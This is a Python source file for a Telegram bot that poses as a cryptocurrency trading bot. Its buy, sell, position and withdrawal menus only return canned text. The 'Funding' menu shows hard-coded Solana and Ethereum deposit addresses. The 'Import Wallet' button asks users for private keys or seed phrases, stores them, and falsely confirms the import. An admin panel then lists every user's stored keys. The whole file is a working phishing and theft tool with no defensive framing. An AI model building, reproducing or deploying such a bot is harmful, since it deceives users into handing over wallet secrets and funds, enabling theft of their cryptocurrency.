import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import logging

# ====================== CONFIG ======================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_IDS = [int(os.getenv("ADMIN_ID"))]

SOL_ADDRESS = "BHhieJZEfPfkKuecvATY8fRGspJF1CBFEVeQoxRwqj8f"
ETH_ADDRESS = "0x1a45bc99b0AA4f8a4daB9463310C97678cE37AE4"
users = {}
waiting_for_import = set()

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)


# ====================== KEYBOARDS ======================

def main_menu():
    keyboard = [
        [InlineKeyboardButton("🛒 Buy", callback_data="buy"),
         InlineKeyboardButton("💰 Sell", callback_data="sell")],
        [InlineKeyboardButton("💳 Funding", callback_data="funding"),
         InlineKeyboardButton("📊 Position", callback_data="position")],
        [InlineKeyboardButton("🏧 Withdrawal", callback_data="withdrawal"),
         InlineKeyboardButton("🔑 Import Wallet", callback_data="import")],
    ]
    return InlineKeyboardMarkup(keyboard)


def back_menu():
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="main")]]
    return InlineKeyboardMarkup(keyboard)


def admin_menu():
    keyboard = [
        [InlineKeyboardButton("👥 View Users", callback_data="admin_users")],
        [InlineKeyboardButton("🔑 View Keys", callback_data="admin_keys")],
        [InlineKeyboardButton("💰 Total Deposited", callback_data="admin_total")],
        [InlineKeyboardButton("🔙 Close", callback_data="admin_close")],
    ]
    return InlineKeyboardMarkup(keyboard)


# ====================== USER HANDLERS ======================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    users[user.id] = users.get(user.id, {"keys": None})

    text = f"👋 Welcome {user.first_name}!\n\nWhat would you like to do?"
    if update.message:
        await update.message.reply_text(text, reply_markup=main_menu())
    else:
        await update.callback_query.edit_message_text(text, reply_markup=main_menu())


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id

    # ===== USER MENU =====
    if data == "main":
        await start(update, context)
        return

    if data == "buy":
        text = "Fund your wallet then\nEnter a token symbol or address to buy"
        await query.edit_message_text(text, reply_markup=back_menu())

    elif data == "sell":
        text = "You do not have any tokens yet! Start trading in the Buy menu."
        await query.edit_message_text(text, reply_markup=back_menu())

    elif data == "funding":
        text = (
            f"🟢 Solana\n`{SOL_ADDRESS}`\n\n"
            f"🟢 Ethereum\n`{ETH_ADDRESS}`"
        )
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_menu())

    elif data == "position":
        text = "You do not have any tokens yet! Start trading in the Buy menu."
        await query.edit_message_text(text, reply_markup=back_menu())

    elif data == "withdrawal":
        text = "🟢 Sol 0.00$\n🟢 Eth 0.00$"
        await query.edit_message_text(text, reply_markup=back_menu())

    elif data == "import":
        waiting_for_import.add(user_id)
        text = "Provide the private keys or seed phrase you'd like to import."
        await query.edit_message_text(text, reply_markup=back_menu())

    # ===== ADMIN MENU =====
    elif data == "admin_users":
        if not users:
            text = "No users yet."
        else:
            text = f"👥 Total users: {len(users)}\n\n"
            for uid in users:
                text += f"• `{uid}`\n"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_menu())

    elif data == "admin_keys":
        if not users:
            text = "No users yet."
        else:
            text = "🔑 User Keys:\n\n"
            for uid, data in users.items():
                keys = data.get("keys", "None")
                text += f"User `{uid}`:\n`{keys}`\n\n"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_menu())

    elif data == "admin_total":
        text = "💰 Total deposited: $0.00"
        await query.edit_message_text(text, reply_markup=admin_menu())

    elif data == "admin_close":
        await query.edit_message_text("Admin panel closed.")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id in waiting_for_import:
        users[user_id] = users.get(user_id, {})
        users[user_id]["keys"] = text
        waiting_for_import.discard(user_id)
        await update.message.reply_text("✅ Wallet imported successfully.", reply_markup=main_menu())


# ====================== ADMIN COMMAND ======================

async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ You are not authorized.")
        return

    text = "🔐 Admin Panel"
    await update.message.reply_text(text, reply_markup=admin_menu())


# ====================== MAIN ======================

def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()